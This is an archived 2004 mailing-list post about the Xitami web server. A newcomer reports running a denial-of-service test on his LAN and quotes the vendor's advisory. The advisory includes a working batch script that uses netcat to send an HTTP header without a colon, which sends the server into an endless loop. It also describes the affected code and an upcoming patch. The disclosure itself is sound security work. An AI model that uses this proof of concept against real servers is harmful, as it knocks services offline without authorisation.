@@ -1,0 +1,151 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [Xitami] Xitami DOS reported
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:xitami%40lists.xitami.org">
+   <META NAME="robots" CONTENT="index,nofollow">
+   
+   <LINK REL="Previous"  HREF="006039.html">
+   <LINK REL="Next"  HREF="006041.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[Xitami] Xitami DOS reported
+   </H1>
+    <B>xitami@lists.xitami.org
+    </B> 
+    <A HREF="mailto:xitami%40lists.xitami.org"
+       TITLE="[Xitami] Xitami DOS reported">xitami@lists.xitami.org
+       </A><BR>
+    <I>Mon, 26 Jul 2004 16:59:30 +0000</I>
+    <P><UL>
+        <LI> Previous message: <A HREF="006039.html">[Xitami] Install
+</A></li>
+        <LI> Next message: <A HREF="006041.html">[Xitami] Pipedef and throttling problems
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#6040">[ date ]</a>
+              <a href="thread.html#6040">[ thread ]</a>
+              <a href="subject.html#6040">[ subject ]</a>
+              <a href="author.html#6040">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>Hello Xitami Forum,   :) :)
+
+I am a newbie at Web stuff and Xitami. I am trying to come up to speed with all the new stuff (compilers; APIs; WEB Pages; Web servers and CGI; etc.).
+
+I understand the DOS script code below using the nc.exe and have it running on my LAN from a client to the Xitami Server. 
+
+The code below runs as expected and a Browser can continue to use the Xitami Server.
+So, since I am new to Xitami, Web Pages, Headers, etc. it appears I need to understand how the MALFORMED HEADER defined below is created in the code below?????
+
+
+Results of running the test code below:
+
+The test code was executed with the following:
+ 
+             test www.gsc.com 80
+
+For testing, the www.gsc.com is maintained locally in the hosts file and points to the IP address of the Xitami server. And, the above execution of the test sends back the contents of the web page defined for www.gsc.com.
+
+Even if the actual IP address of the Xitami Server is used it sends back error messages:
+
+           403 forbidden       
+           You are not authorized to access this reasource
+
+And, the Xitami Server can continue to be accessed by a Browser.
+
+
+I took a stab at modifying the line: echo HOST: %1&gt;&gt;http.tmp and removed the : from HOST:
+But, Xitami sent back the error: 
+
+           403 forbidden       
+           You are not authorized to access this reasource
+
+And, Xitami continues to work from a Browser as expected.
+
+
+Thanks for your time, help, and advise!!!! :) :)
+
+Jerry
+
+
+-------------- Original message from Pieter Hintjens : -------------- 
+&gt;<i> Hi, 
+</I>&gt;<i> 
+</I>&gt;<i> A serious denial of service has been found in Xitami. This is the report: 
+</I>&gt;<i> 
+</I>&gt;<i> -------------------------------------------------------------- 
+</I>&gt;<i> Application: Xitami Web Server 
+</I>&gt;<i> Vendors: <A HREF="http://www.xitami.com/xiopen_2_5.zip">http://www.xitami.com/xiopen_2_5.zip</A> 
+</I>&gt;<i> Version: v2.5c1 
+</I>&gt;<i> Platforms: Windows 
+</I>&gt;<i> Bug: D.O.S 
+</I>&gt;<i> Date: 2004-07-15 
+</I>&gt;<i> Author: CoolICE 
+</I>&gt;<i> e-mail: CoolICE#China.com 
+</I>&gt;<i> ================ 
+</I>&gt;<i> Content: 
+</I>&gt;<i> ---------------- 
+</I>&gt;<i> TestCode: 
+</I>&gt;<i> @echo off 
+</I>&gt;<i> :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+</I>&gt;<i> :Application: Xitami Web Server 
+</I>&gt;<i> :Vendors: <A HREF="http://www.xitami.com/xiopen_2_5.zip">http://www.xitami.com/xiopen_2_5.zip</A> 
+</I>&gt;<i> :Version: v2.5c1 
+</I>&gt;<i> :Platforms: Windows 
+</I>&gt;<i> :Bug: D.O.S 
+</I>&gt;<i> :Date: 2004-07-15 
+</I>&gt;<i> :Author: CoolICE 
+</I>&gt;<i> :e-mail: CoolICE#China.com 
+</I>&gt;<i> :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: 
+</I>&gt;<i> if '%1'=='' echo Usage:%0 target [port]&amp;&amp;goto :eof 
+</I>&gt;<i> set PORT=80 
+</I>&gt;<i> if not '%2'=='' set PORT=%2 
+</I>&gt;<i> for %%n in (nc.exe) do if not exist %%~$PATH:n if not exist nc.exe echo Need 
+</I>&gt;<i> nc. 
+</I>&gt;<i> exe&amp;&amp;goto :eof 
+</I>&gt;<i> echo GET / HTTP/1.0&gt;http.tmp 
+</I>&gt;<i> echo HOST: %1&gt;&gt;http.tmp 
+</I>&gt;<i> echo DOS&gt;&gt;http.tmp 
+</I>&gt;<i> echo.&gt;&gt;http.tmp 
+</I>&gt;<i> nc -w 10 %1 %PORT% &lt; http.tmp 
+</I>&gt;<i> del http.tmp 
+</I>&gt;<i> -------------------------------------------------------------- 
+</I>&gt;<i> 
+</I>&gt;<i> The denial of service is this: a malformed header (without the ':') causes the 
+</I>&gt;<i> server to enter an endless loop. 
+</I>&gt;<i> 
+</I>&gt;<i> This DOS affects all versions of Xitami. For those building from source, the 
+</I>&gt;<i> affected file is smthttpl.c, and the patch is in the function 
+</I>&gt;<i> http_parse_header: 
+</I>&gt;<i> 
+</I>&gt;<i> We are in the process of releasing new binaries, which will be on Xitami.com 
+</I>&gt;<i> in a very short while. 
+</I>&gt;<i> 
+</I>&gt;<i> -- 
+</I>&gt;<i> Pieter Hintjens 
+</I>&gt;<i> iMatix Corporation 
+</I>&gt;<i> 
+</I>
+
+</PRE>
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI> Previous message: <A HREF="006039.html">[Xitami] Install
+</A></li>
+	<LI> Next message: <A HREF="006041.html">[Xitami] Pipedef and throttling problems
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#6040">[ date ]</a>
+              <a href="thread.html#6040">[ thread ]</a>
+              <a href="subject.html#6040">[ subject ]</a>
+              <a href="author.html#6040">[ author ]</a>
+         </LI>
+       </UL>
+</body></html>
